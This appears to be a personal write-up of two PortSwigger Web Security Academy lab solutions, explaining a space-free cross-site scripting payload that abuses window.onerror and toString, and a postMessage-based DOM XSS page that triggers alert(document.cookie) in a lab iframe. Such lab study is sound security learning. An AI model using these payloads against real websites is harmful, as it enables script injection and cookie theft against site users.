---
title: XSS Vectors
date: 2021-11-16T21:07:41+01:00
---
# XSS Vectors
## XSS Vector Without Spaces, Using Throw

This payload is taken from the portswigger academy [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked). The request url is the following `/post?postId=5&%27},x=x=%3E{onerror=alert;throw/**/1337},toString=x,window+'',{x:'<`. When the request is sent, the injected html looks like this:

``` html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5%26%27},x%3dx%3d%3e{onerror%3dalert%3bthrow/**/1337},toString%3dx,window+%27%27,{x%3a%27%3c'}).finally(_ => window.location = '/')">Back to Blog</a>
```

When we extract just the href attribute, remove the javascript prefix and url-decode everything(remember, since we are in an href, url encoded values are actually used in their decoded form, so even though the \' is encoded to %27, it still closes the previous single quote) we are left with the js code:

``` javascript
fetch('/analytics',
  {method:'post',body:'/post?postId=5&'},x=x=>{onerror=alert;throw/**/1337},toString=x,window+''
      ,{x:''}).finally(_ => window.location = '/')
```

What this vector does can be split up into steps:

1.  close the `body:` of the dictionary and close the dictionary, and add a new parameter to the call of the `fetch()` function.
2.  In this new call, define a new function `x` that always throws the error `1337` a. When the function is called, `window.onerror` is set to the `alert` function, so every error thrown in `x()` is passed to `alert` b. then, we throw an error with the message `1337` c. `x(x)` also has a parameter named x, this is because we use the x function as a substitute for `toString`. If we hadn\'t defined it like that, the javascript interpreter would throw an error before we could even call `x`, therefore, our payload wouldn\'t run.
3.  Then, with `toString=x`, we set the toString function to x
4.  Finally, we run `window+''`, which implicitly calls toString and therefore runs our malicious function x.
5.  The rest are used to close the dictionary that we have injected into so that we end up with valid javascript.

# DOM Based XSS message

``` html
<script>
function message(){
document.getElementById('xss').contentWindow.postMessage('{"type":"load-channel","url":"javascript:alert(document.cookie)"}','*');
}
</script>

<iframe height=1000 width=1000 id="xss" src="https://aca21f1a1ea5dc85808d28650079004d.web-security-academy.net/" onload="message()">
</iframe>
```